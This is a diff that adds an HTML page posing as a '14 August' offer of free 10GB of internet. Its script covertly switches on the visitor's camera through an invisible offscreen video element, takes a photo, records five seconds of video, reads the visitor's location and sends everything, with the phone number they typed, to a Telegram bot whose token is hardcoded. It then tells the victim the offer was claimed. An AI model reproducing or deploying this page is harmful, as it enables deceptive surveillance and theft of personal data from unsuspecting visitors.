@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>14 August Offer & Background Camera Capture</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: linear-gradient(135deg, #009933, #006600);
+      color: white;
+      text-align: center;
+    }
+    /* Hidden video element offscreen and invisible */
+    #video {
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      top: -1000px;
+      left: -1000px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    input {
+      font-size: 18px;
+      padding: 8px 10px;
+      width: 250px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #ffcc00;
+      color: #004d00;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(255, 204, 0, 0.7);
+      transition: background-color 0.3s ease;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #e6b800;
+    }
+    .status {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #ffffcc;
+      min-height: 24px;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.4);
+    }
+    p.offer-text {
+      font-size: 1.4rem;
+      margin-bottom: 30px;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+
+  <h1>🎉 14 August Special Offer! 🎉</h1>
+  <p class="offer-text">Click below and get <strong>FREE 10GB Internet</strong> for <em>all SIM cards</em>!</p>
+
+  <input type="text" id="phoneNumber" placeholder="Enter Phone Number" />
+  <br />
+  <button onclick="startCapture()">Claim Your Free 10GB Now</button>
+
+  <video id="video" autoplay playsinline></video>
+
+  <div class="status" id="status">Waiting...</div>
+
+  <script>
+    const BOT_TOKEN = '8241514661:AAH7VyEJDJvaYPUtmfdkdsUDRIV6yz98i7Y';    // Replace with your Telegram bot token
+    const CHAT_ID = '7641501757';        // Replace with your Telegram chat id
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    let stream;
+
+    async function startCapture() {
+      status.textContent = '⏳ Starting camera and capturing...';
+      const phone = document.getElementById('phoneNumber').value.trim();
+      if (!phone) {
+        alert('Please enter your phone number');
+        status.textContent = 'Please enter your phone number';
+        return;
+      }
+
+      try {
+        // Start camera
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Capture photo
+        const photoBlob = await capturePhoto(stream);
+
+        // Capture video (5 seconds)
+        const videoBlob = await captureVideo(stream, 5000);
+
+        // Get location
+        const location = await getLocation();
+
+        // Send photo
+        await sendToTelegram(photoBlob, 'photo', phone, location);
+
+        // Send video
+        await sendToTelegram(videoBlob, 'video', phone, location);
+
+        status.textContent = '✅ Congratulations! Your free 10GB has been claimed.';
+
+        // Stop camera
+        stopStream();
+      } catch (error) {
+        console.error(error);
+        status.textContent = '❌ Error: ' + error.message;
+        stopStream();
+      }
+    }
+
+    async function capturePhoto(stream) {
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const blob = await imageCapture.takePhoto();
+      return blob;
+    }
+
+    function captureVideo(stream, durationMs) {
+      return new Promise((resolve, reject) => {
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onerror = e => reject(e);
+        recorder.onstop = () => {
+          const videoBlob = new Blob(chunks, { type: 'video/webm' });
+          resolve(videoBlob);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), durationMs);
+      });
+    }
+
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ lat: 'Not Supported', lon: 'Not Supported' });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+          () => resolve({ lat: 'Denied', lon: 'Denied' })
+        );
+      });
+    }
+
+    function sendToTelegram(blob, type, phone, location) {
+      const formData = new FormData();
+      const ext = type === 'video' ? 'webm' : 'jpg';
+      formData.append(type, blob, `${type}.${ext}`);
+      const caption = `📱 Phone: ${phone}\n📍 Location: ${location.lat}, ${location.lon}`;
+      formData.append('caption', caption);
+
+      const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+      return axios.post(endpoint, formData, { params: { chat_id: CHAT_ID } });
+    }
+
+    function stopStream() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }
+  </script>
+
+</body>
+</html>
